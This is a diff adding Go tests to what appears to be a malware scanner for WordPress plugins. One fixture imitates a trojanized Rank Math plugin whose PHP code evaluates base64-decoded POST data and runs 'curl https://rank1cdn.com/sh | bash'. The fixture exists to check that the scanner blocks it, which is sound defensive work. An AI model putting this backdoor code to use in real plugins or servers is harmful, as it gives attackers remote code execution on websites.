@@ -104,3 +104,60 @@ version = "0.5.0"
 		t.Errorf("expected exit code 0 for benign python package, got %d", code)
 	}
 }
+
+func TestRunWordPressPlugin(t *testing.T) {
+	tmpDir := t.TempDir()
+
+	pluginPhp := `<?php
+/*
+ * Plugin Name: Safe Analytics Widget
+ * Version: 2.1.0
+ */
+function my_widget() { return "ok"; }
+`
+	if err := os.WriteFile(filepath.Join(tmpDir, "analytics.php"), []byte(pluginPhp), 0o644); err != nil {
+		t.Fatalf("writing analytics.php: %v", err)
+	}
+
+	cfg := &cliConfig{
+		failOnCritical: true,
+		noColor:        true,
+		paths:          []string{tmpDir},
+	}
+
+	code := run(cfg)
+	if code != 0 {
+		t.Errorf("expected exit code 0 for benign WordPress plugin, got %d", code)
+	}
+}
+
+func TestRunMaliciousRankMathWordPressPlugin(t *testing.T) {
+	tmpDir := t.TempDir()
+
+	pluginPhp := `<?php
+/*
+ * Plugin Name: Rank Math SEO PRO
+ * Version: 3.0.123
+ */
+// Injected C2 & backdoor payload
+$c2 = "https://rank1cdn.com/api/ping";
+$xor_key = "xmmqhn";
+$data = base64_decode($_POST['data']);
+eval($data);
+proc_open("curl https://rank1cdn.com/sh | bash", [], $p);
+`
+	if err := os.WriteFile(filepath.Join(tmpDir, "rank-math-pro.php"), []byte(pluginPhp), 0o644); err != nil {
+		t.Fatalf("writing rank-math-pro.php: %v", err)
+	}
+
+	cfg := &cliConfig{
+		failOnCritical: true,
+		noColor:        true,
+		paths:          []string{tmpDir},
+	}
+
+	code := run(cfg)
+	if code != 1 {
+		t.Errorf("expected exit code 1 (BLOCKED) for trojanized Rank Math plugin, got %d", code)
+	}
+}
